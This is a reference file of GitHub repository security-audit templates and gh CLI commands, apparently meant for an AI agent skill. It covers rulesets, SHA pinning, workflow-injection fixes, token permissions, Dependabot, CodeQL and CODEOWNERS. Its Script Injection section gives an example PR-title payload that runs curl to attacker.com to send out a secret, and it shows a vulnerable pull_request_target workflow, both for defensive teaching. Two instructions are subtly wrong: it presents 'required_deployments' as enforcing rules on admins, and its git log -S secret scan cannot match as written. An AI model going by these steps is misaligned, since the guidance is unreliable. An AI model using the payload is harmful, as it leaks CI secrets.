# GitHub Audit Reference Checks

Templates, commands, and fix patterns. Loaded on-demand by the skill during Phase 4.

---

## Branch Protection — Baseline Ruleset (API)

Creates a ruleset via the GitHub API. Prefer rulesets over legacy branch protection rules — rulesets support multiple enforcement modes and stack with org-level rules.

```bash
gh api repos/{owner}/{repo}/rulesets --method POST --input - <<'EOF'
{
  "name": "main-protection",
  "target": "branch",
  "enforcement": "active",
  "conditions": {
    "ref_name": {
      "include": ["refs/heads/main", "refs/heads/master"],
      "exclude": []
    }
  },
  "rules": [
    { "type": "deletion" },
    { "type": "non_fast_forward" },
    {
      "type": "pull_request",
      "parameters": {
        "required_approving_review_count": 1,
        "dismiss_stale_reviews_on_push": true,
        "require_code_owner_review": false,
        "require_last_push_approval": false,
        "required_review_thread_resolution": false
      }
    },
    {
      "type": "required_status_checks",
      "parameters": {
        "strict_required_status_checks_policy": false,
        "required_status_checks": []
      }
    }
  ]
}
EOF
```

To also require signed commits, add to the `rules` array:
```json
{ "type": "required_signatures" }
```

To enforce on admins too, add:
```json
{ "type": "required_deployments", "parameters": { "required_deployment_environments": [] } }
```

---

## Action Pinning — Resolve SHA for a Tag

Replace mutable tags with full commit SHAs. Always add a comment with the original tag so humans know what version it is.

```bash
# Step 1: resolve the SHA behind a tag
gh api repos/{action-owner}/{action-repo}/git/ref/tags/{tag} --jq '.object.sha'

# Step 2: if the result is a tag object (not a commit), dereference it
gh api repos/{action-owner}/{action-repo}/git/tags/{tag-object-sha} --jq '.object.sha'
```

**Common actions — resolve these before writing any workflow:**
```bash
# actions/checkout
gh api repos/actions/checkout/git/ref/tags/v4 --jq '.object.sha'

# actions/setup-node
gh api repos/actions/setup-node/git/ref/tags/v4 --jq '.object.sha'

# actions/upload-artifact
gh api repos/actions/upload-artifact/git/ref/tags/v4 --jq '.object.sha'

# github/codeql-action
gh api repos/github/codeql-action/git/ref/tags/v3 --jq '.object.sha'
```

**Before:**
```yaml
uses: actions/checkout@v4
```

**After:**
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4
```

---

## Dangerous Workflow Pattern — Fix

**Vulnerable pattern (pull_request_target + checkout of PR head):**
```yaml
on:
  pull_request_target:

jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out untrusted code
```

An external PR author controls what code runs in this job — and this trigger has access to repo secrets.

**Option A — Simplest: switch to `pull_request`**
No secrets available in this trigger. Safe for linting, testing, building untrusted code.
```yaml
on:
  pull_request:
```

**Option B — Keep `pull_request_target` but never check out PR code**
Use this if you need repo secrets (e.g., for posting comments, creating deployments) but do NOT need to build the PR's code.
```yaml
on:
  pull_request_target:

jobs:
  comment:
    steps:
      - uses: actions/checkout@{SHA}  # no 'ref:' — checks out base branch only
```

**Option C — Two-job split (need both secrets and PR code)**
Job 1 runs on `pull_request` (untrusted, no secrets), builds artifacts and uploads them.
Job 2 runs on `workflow_run` when Job 1 completes — downloads artifacts (never checks out PR code) and uses secrets for deployment/posting results.

---

## GITHUB_TOKEN Permissions — Minimal Templates

Add to the top level of a workflow (applies to all jobs) or at the job level (overrides for that job).

**Default read-only (most workflows):**
```yaml
permissions:
  contents: read
```

**PR comment posting:**
```yaml
permissions:
  contents: read
  pull-requests: write
```

**Creating a release:**
```yaml
permissions:
  contents: write
```

**CodeQL / code scanning:**
```yaml
permissions:
  contents: read
  security-events: write
```

**Pushing to a branch (e.g., auto-formatting):**
```yaml
permissions:
  contents: write
```

---

## Script Injection — Fix Pattern

**Vulnerable:** user-controlled data interpolated directly into a shell command.
```yaml
- name: Echo PR title
  run: echo "Title: ${{ github.event.pull_request.title }}"
```
A PR titled `"; curl attacker.com/exfil?t=$SECRET"` runs that curl.

**Fixed:** assign to an env var, then reference the var in shell.
```yaml
- name: Echo PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```
The shell never evaluates `${{ }}` — it only sees the env var name.

---

## Dependabot Config — Starter Template

`.github/dependabot.yml` — always include `github-actions`. Add package managers actually in use.

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  # Uncomment and add ecosystems matching the repo:
  # - package-ecosystem: "npm"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"

  # - package-ecosystem: "pip"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"

  # - package-ecosystem: "cargo"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"

  # - package-ecosystem: "gomod"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"

  # - package-ecosystem: "bundler"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"

  # - package-ecosystem: "docker"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"
```

---

## SECURITY.md — Minimal Template

```markdown
# Security Policy

## Supported Versions

| Version | Supported |
|---------|-----------|
| latest  | ✅        |

## Reporting a Vulnerability

Please report security vulnerabilities using [GitHub's private vulnerability reporting](../../security/advisories/new).

Do not open a public issue for security vulnerabilities.

We aim to acknowledge reports within 72 hours and provide a resolution timeline within 7 days.
```

---

## CodeQL Workflow — Starter Template

Resolve action SHAs before writing this file (see Action Pinning section above).

`.github/workflows/codeql.yml`:
```yaml
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 12 * * 1'

permissions:
  contents: read
  security-events: write

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@{CHECKOUT_SHA}  # resolve before using

      - name: Initialize CodeQL
        uses: github/codeql-action/init@{CODEQL_SHA}  # resolve before using
        with:
          languages: auto

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@{CODEQL_SHA}  # same SHA as init
```

After writing: verify it appears in Actions → Workflows and triggers on the next push.

---

## CODEOWNERS — Template

`.github/CODEOWNERS`:
```
# Workflow files and repo security config — route all changes to the owner
/.github/workflows/    @{owner}
/.github/CODEOWNERS    @{owner}
/.github/              @{owner}

# Security policy
/SECURITY.md           @{owner}
/.github/SECURITY.md   @{owner}
```

Replace `{owner}` with the GitHub username or team handle (e.g., `@myorg/security-team`).

For CODEOWNERS to be enforced, branch protection must have "Require review from Code Owners" enabled. Check with:
```bash
gh api repos/{owner}/{repo}/branches/main/protection --jq '.required_pull_request_reviews.require_code_owner_reviews'
```

---

## Key gh CLI Audit Commands

```bash
# Full security settings overview
gh api repos/{owner}/{repo} --jq '{
  visibility,
  private: .private,
  allow_forking: .allow_forking,
  has_wiki: .has_wiki,
  has_pages: .has_pages,
  has_discussions: .has_discussions,
  security: .security_and_analysis,
  private_vulnerability_reporting: .private_vulnerability_reporting_enabled
}'

# Branch protection (legacy)
gh api repos/{owner}/{repo}/branches/{branch}/protection

# Rulesets
gh api repos/{owner}/{repo}/rulesets --jq '[.[] | {name, enforcement, target}]'

# Open Dependabot alerts
gh api repos/{owner}/{repo}/dependabot/alerts \
  --jq '[.[] | select(.state=="open") | {package: .dependency.package.name, severity: .security_advisory.severity, cve: .security_advisory.cve_id}]'

# Open secret scanning alerts
gh api repos/{owner}/{repo}/secret-scanning/alerts \
  --jq '[.[] | select(.state=="open") | {number, secret_type, created_at}]'

# Open code scanning alerts
gh api repos/{owner}/{repo}/code-scanning/alerts \
  --jq '[.[] | select(.state=="open") | {number, rule: .rule.id, severity: .rule.severity}]'

# Collaborators with admin
gh api repos/{owner}/{repo}/collaborators \
  --jq '[.[] | select(.permissions.admin == true) | .login]'

# Outside collaborators
gh api repos/{owner}/{repo}/collaborators?affiliation=outside \
  --jq '[.[] | {login, permissions}]'

# Deploy keys
gh api repos/{owner}/{repo}/keys \
  --jq '[.[] | {id, title, read_only, created_at}]'

# Webhooks
gh api repos/{owner}/{repo}/hooks \
  --jq '[.[] | {id, active, url: .config.url, insecure_ssl: .config.insecure_ssl, has_secret: (.config.secret != null and .config.secret != "")}]'

# Private vulnerability reporting
gh api repos/{owner}/{repo} --jq '.private_vulnerability_reporting_enabled'

# Enable secret scanning
gh api repos/{owner}/{repo} --method PATCH \
  -f 'security_and_analysis[secret_scanning][status]=enabled'

# Enable push protection
gh api repos/{owner}/{repo} --method PATCH \
  -f 'security_and_analysis[secret_scanning_push_protection][status]=enabled'

# Enable Dependabot alerts
gh api repos/{owner}/{repo}/vulnerability-alerts --method PUT

# Enable private vulnerability reporting
gh api repos/{owner}/{repo} --method PATCH \
  -f 'private_vulnerability_reporting_enabled=true'

# Delete a deploy key
gh api repos/{owner}/{repo}/keys/{key_id} --method DELETE

# Scan git history for potential secrets (basic signal)
git log --all --oneline -S 'password\|secret\|api_key\|token\|credential' 2>/dev/null | wc -l
```
